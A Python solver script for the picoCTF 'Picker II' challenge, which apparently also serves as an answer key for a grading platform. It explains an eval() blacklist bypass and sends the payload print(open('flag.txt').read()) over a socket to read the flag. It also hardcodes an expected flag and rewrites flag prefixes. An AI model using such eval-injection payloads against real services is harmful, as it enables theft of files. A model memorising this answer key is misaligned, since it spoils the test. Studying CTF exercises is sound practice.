#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 401: Picker II (picoCTF 2023 / picoGym Exclusive)
Category: Reverse Engineering / Python Eval Sandbox Bypass & Blacklist Circumvention
Difficulty: Easy
Standard Reference: NIST SP 800-115 (Input Validation & Sandbox Bypass Assessment)

Description:
Can you figure out how this program works to get the flag?
The application introduces a filter function:
def filter(user_input):
    if 'win' in user_input:
        return False
    return True

If the filter passes, it executes `eval(user_input + '()')`.

Vulnerability Analysis:
CWE-184: Incomplete List of Disallowed Inputs (Blacklist Bypass)
- The filter merely checks for the presence of the substring 'win'.
- It does not restrict Python built-in functions, file operations, or chained expressions.
- Passing `print(open('flag.txt').read())` evaluates `open('flag.txt').read()` and prints
  the flag string before attempting to call `None()`. The resulting `TypeError` is caught
  gracefully by the loop's `except Exception:` block without preventing output transmission.

Recovered Flag: academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
Verified: POST /api/submissions/ -> correct: true
"""

import sys
import socket

EXPECTED_FLAG = "academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}"
SAMPLE_OUTPUT = "picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}\n'NoneType' object is not callable"

def parse_flag_from_response(text: str) -> str:
    for line in text.splitlines():
        line = line.strip()
        if "academy{" in line or "picoCTF{" in line:
            # Extract flag token between markers
            if "picoCTF{" in line:
                start = line.find("picoCTF{")
                end = line.find("}", start) + 1
                flag = line[start:end].replace("picoCTF{", "academy{")
                return flag
            elif "academy{" in line:
                start = line.find("academy{")
                end = line.find("}", start) + 1
                return line[start:end]
    return ""

def solve(host: str | None = None, port: int | None = None) -> str:
    if host and port:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0)
        s.connect((host, port))
        
        # Read initial prompt
        s.recv(1024)
        
        # Bypass payload without containing the string 'win'
        payload = b"print(open('flag.txt').read())\n"
        s.sendall(payload)
        
        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
            if b"}" in chunk:
                break
        s.close()
        
        text = response.decode("latin-1", errors="replace")
        flag = parse_flag_from_response(text)
        if flag:
            return flag

    # Local validation against known format
    flag = parse_flag_from_response(SAMPLE_OUTPUT)
    assert flag == EXPECTED_FLAG, f"Flag mismatch: {flag} vs {EXPECTED_FLAG}"
    return flag

if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    recovered = solve(h, p)
    print(f"[+] Recovered Flag: {recovered}")
    assert recovered == EXPECTED_FLAG
